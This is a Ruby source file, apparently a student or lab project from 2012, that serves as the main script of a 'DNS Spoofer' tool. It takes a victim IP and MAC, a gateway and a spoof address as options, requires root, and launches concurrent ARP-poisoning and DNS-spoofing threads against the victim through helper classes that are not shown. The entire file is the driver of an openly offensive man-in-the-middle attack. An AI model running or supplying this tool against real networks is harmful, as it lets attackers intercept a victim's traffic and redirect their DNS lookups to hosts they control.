#!/usr/bin/env ruby

#-------------------------------------------------------------------------------
# main.rb
#
# Author: Karl Castillo
#
# Date: October 26, 2012
#
# Revisions: (Date and Description)
#
# Notes:
#-------------------------------------------------------------------------------
require 'rubygems'
require 'packetfu'
require 'thread'

# Local Ruby Files
curdir = File.dirname(__FILE__)
require curdir + '/arp.rb'
require curdir + '/dns.rb'
require curdir + '/lib/lib_trollop.rb'

#------
# Trollop Command Line Argument Parsing
#------
opts = Trollop::options do
    version "DNS Spoofer V1.0 (c) 2012 Karl Castillo"
    banner <<-EOS
DNS Spoofer in Ruby.

Usage:
    ruby main.rb [options]
    EOS
    
    opt :host, "Victim IP", :short => "H", :type => :string, :default => "192.168.1.72" # String --host <s>, default 127.0.0.1
    opt :mac, "Victim MAC", :short => "M", :type => :string # String --mac <s>
    opt :spoof, "Spoofig IP", :short => "S", :type => :string, :default => "70.70.242.254" # String --spoof <s>, default 70.70.242.254
    opt :gate, "Gateway", :short => "G", :type => :string, :default => "192.168.1.254" # String --gate <s>, default 192.168.0.100
    opt :iface, "Interface", :short => "i", :type => :string, :default => "wlan0" # String --iface <s>, default em1
    
end # Trollop

#------
# Preparations
#------

# Check if user is running as root
raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0

#------
# Start Spoofing!
#------
begin
    # Create necessary objects
    arp = ARPSpoof.new(opts[:host], opts[:mac], opts[:gate], opts[:iface])
    dns = DNSSpoof.new(opts[:spoof], opts[:host], opts[:iface])
    arp_thread = Thread.new { arp.start }
    dns_thread = Thread.new{ dns.start }
    
    # Start both spoofing threads
    arp_thread.join
    sleep 1
    dns_thread.join
    
    # Catch CTRL^C
    rescue Interrupt
    
    # Stop ARP spoofing
    puts "\nKilling ARP Poision Thread"
    arp.stop
    Thread.kill(arp_thread)
    
    # Stop DNS spoofing
    puts "Killing DNS Spoof Thread"
    Thread.kill(dns_thread)
    
    exit 0
end
